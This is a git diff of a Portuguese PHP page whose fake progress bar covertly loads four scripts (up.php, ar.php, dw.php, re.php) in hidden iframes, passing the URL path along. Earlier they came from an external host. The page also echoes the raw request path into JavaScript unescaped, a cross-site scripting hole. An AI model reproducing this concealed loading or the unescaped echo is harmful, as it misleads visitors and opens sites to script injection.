@@ -1,177 +1,98 @@
+<?php
+// 1. Captura o conteúdo da URL atual
+$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
+$slug = trim($uri, '/');
+
+// 2. Configuração via JSON (Define a ordem e em qual % cada PHP dispara)
+$config_json = '{
+    "scripts": [
+        {"file": "up.php", "trigger_at": 25, "label": "Iniciando Recebimento..."},
+        {"file": "ar.php", "trigger_at": 50, "label": "Baixando pacotes..."},
+        {"file": "dw.php", "trigger_at": 75, "label": "Fazendo Upload..."},
+        {"file": "re.php", "trigger_at": 100, "label": "Arquivando dados..."}
+    ]
+}';
+?>
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Processamento de Dados</title>
+    <title>Processamento Sincronizado</title>
     <style>
-        :root {
-            --bg-color: #0f172a;
-            --primary-color: #38bdf8;
-            --track-color: #1e293b;
-            --card-bg: rgba(30, 41, 59, 0.5);
-        }
-
-        body {
-            background: radial-gradient(circle at center, #1e293b 0%, #0f172a 100%);
-            color: white;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
-        }
-
-        .container {
-            text-align: center;
-            padding: 3rem;
-            background: var(--card-bg);
-            border-radius: 24px;
-            backdrop-filter: blur(10px);
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-        }
-
-        h2 { 
-            margin-bottom: 30px; 
-            font-weight: 300; 
-            letter-spacing: 1px;
-            color: #f1f5f9;
-        }
-
-        .progress-ring {
-            position: relative;
-            width: 200px;
-            height: 200px;
-            margin: 0 auto;
-        }
-
-        .progress-ring svg {
-            transform: rotate(-90deg);
-            filter: drop-shadow(0 0 8px rgba(56, 189, 248, 0.3));
-        }
-
-        .progress-ring__circle {
-            stroke-dasharray: 565.48;
-            stroke-dashoffset: 565.48;
-            transition: stroke-dashoffset 0.5s ease-out;
-            stroke-linecap: round;
-        }
-
-        .percent-text {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 2.8rem;
-            font-weight: 800;
-            color: var(--primary-color);
-            text-shadow: 0 0 20px rgba(56, 189, 248, 0.2);
-        }
-
-        .hidden-loader {
-            position: absolute;
-            width: 1px;
-            height: 1px;
-            padding: 0;
-            margin: -1px;
-            overflow: hidden;
-            clip: rect(0, 0, 0, 0);
-            white-space: nowrap;
-            border: 0;
-        }
-
-        .loading-dots:after {
-            content: ' .';
-            animation: dots 1.5s steps(5, end) infinite;
-        }
-
-        @keyframes dots {
-            0%, 20% { content: '.'; }
-            40% { content: '..'; }
-            60% { content: '...'; }
-            80%, 100% { content: ''; }
-        }
+        :root { --bg: #030712; --accent: #38bdf8; }
+        body { background: var(--bg); color: white; font-family: 'Inter', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .main-card { background: rgba(17, 24, 39, 0.8); padding: 40px; border-radius: 20px; border: 1px solid rgba(56, 189, 248, 0.2); text-align: center; width: 320px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        .progress-container { width: 100%; height: 8px; background: #1f2937; border-radius: 10px; margin: 25px 0; overflow: hidden; }
+        .progress-bar { width: 0%; height: 100%; background: var(--accent); box-shadow: 0 0 15px var(--accent); transition: width 0.2s linear; }
+        .percent-text { font-size: 3rem; font-weight: 900; color: var(--accent); margin: 0; }
+        .status-label { text-transform: uppercase; font-size: 10px; letter-spacing: 2px; color: #94a3b8; }
+        #hidden-loader { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="container">
-        <h2 id="status-title">Processando<span class="loading-dots"></span></h2>
+    <div class="main-card">
+        <div class="status-label" id="status-top">Processando</div>
+        <div class="percent-text" id="pct">0%</div>
         
-        <div class="progress-ring">
-            <svg width="200" height="200">
-                <circle stroke="var(--track-color)" stroke-width="12" fill="transparent" r="90" cx="100" cy="100"/>
-                <circle id="progress-bar" class="progress-ring__circle" stroke="var(--primary-color)" stroke-width="12" fill="transparent" r="90" cx="100" cy="100"/>
-            </svg>
-            <div class="percent-text" id="percent-display">0%</div>
+        <div class="progress-container">
+            <div id="bar" class="progress-bar"></div>
+        </div>
+
+        <div id="info" style="font-size: 13px; color: #64748b; min-height: 20px;">
+            Aguardando...
         </div>
     </div>
 
-    <!-- Os SRCs agora são injetados via JavaScript -->
-    <div id="loader-container" class="hidden-loader"></div>
+    <div id="hidden-loader"></div>
 
     <script>
-        const circle = document.getElementById('progress-bar');
-        const percentDisplay = document.getElementById('percent-display');
-        const statusTitle = document.getElementById('status-title');
-        const loaderContainer = document.getElementById('loader-container');
+        // Transforma o JSON do PHP em objeto JS
+        const config = <?php echo $config_json; ?>;
+        const payload = "<?php echo $slug; ?>";
         
-        const radius = circle.r.baseVal.value;
-        const circumference = 2 * Math.PI * radius;
+        let progress = 0;
+        const bar = document.getElementById('bar');
+        const pct = document.getElementById('pct');
+        const info = document.getElementById('info');
+        const loader = document.getElementById('hidden-loader');
 
-        let secondsRemaining = 60;
-        const totalDuration = 60;
+        // Conjunto para evitar disparar o mesmo arquivo mais de uma vez
+        const fired = new Set();
 
-        circle.style.strokeDasharray = `${circumference} ${circumference}`;
-
-        // --- LÓGICA DE URL DINÂMICA ---
-        function setupIframes() {
-            // Pega tudo após o domínio (ex: /seu-parametro)
-            const slug = window.location.pathname; 
+        const interval = setInterval(() => {
+            progress += 1;
             
-            const baseUrls = [
-                "https://storage-amheex.onrender.com/re.php",
-                "https://storage-amheex.onrender.com/dw.php",
-                "https://storage-amheex.onrender.com/up.php",
-                "https://storage-amheex.onrender.com/ar.php"
-            ];
+            // Atualiza Visual
+            bar.style.width = progress + "%";
+            pct.innerText = progress + "%";
 
-            baseUrls.forEach(url => {
-                const ifrm = document.createElement("iframe");
-                // Concatena a URL base com o conteúdo capturado da URL atual
-                ifrm.src = url + slug; 
-                loaderContainer.appendChild(ifrm);
+            // Verifica no JSON se há um script para a porcentagem atual
+            config.scripts.forEach(item => {
+                if (progress >= item.trigger_at && !fired.has(item.file)) {
+                    fired.add(item.file);
+                    
+                    // Atualiza o texto na tela
+                    info.innerText = item.label;
+                    
+                    // Dispara o PHP via iframe oculto
+                    const ifrm = document.createElement("iframe");
+                    ifrm.src = item.file + "/" + payload;
+                    loader.appendChild(ifrm);
+                    
+                    console.log(`Disparado: ${item.file} aos ${progress}%`);
+                }
             });
-        }
 
-        function updateProgress() {
-            if (secondsRemaining < 0) return;
-
-            const elapsed = totalDuration - secondsRemaining;
-            const percent = Math.floor((elapsed / totalDuration) * 100);
-            
-            percentDisplay.innerText = `${percent}%`;
-
-            const offset = circumference - (percent / 100) * circumference;
-            circle.style.strokeDashoffset = offset;
-
-            if (secondsRemaining > 0) {
-                secondsRemaining--;
-                setTimeout(updateProgress, 1000);
-            } else {
-                percentDisplay.innerText = "100%";
-                statusTitle.innerHTML = "Concluído!";
-                statusTitle.style.color = "#4ade80";
+            if (progress >= 100) {
+                clearInterval(interval);
+                document.getElementById('status-top').innerText = "Finalizado";
+                document.getElementById('status-top').style.color = "#4ade80";
+                info.innerText = "Todos os processos concluídos!";
+                info.style.color = "#4ade80";
             }
-        }
-
-        // Inicia tudo ao carregar a página
-        window.onload = () => {
-            setupIframes();
-            updateProgress();
-        };
+        }, 150); // Velocidade: 150ms por 1% (aprox. 15 segundos total)
     </script>
 </body>
 </html>
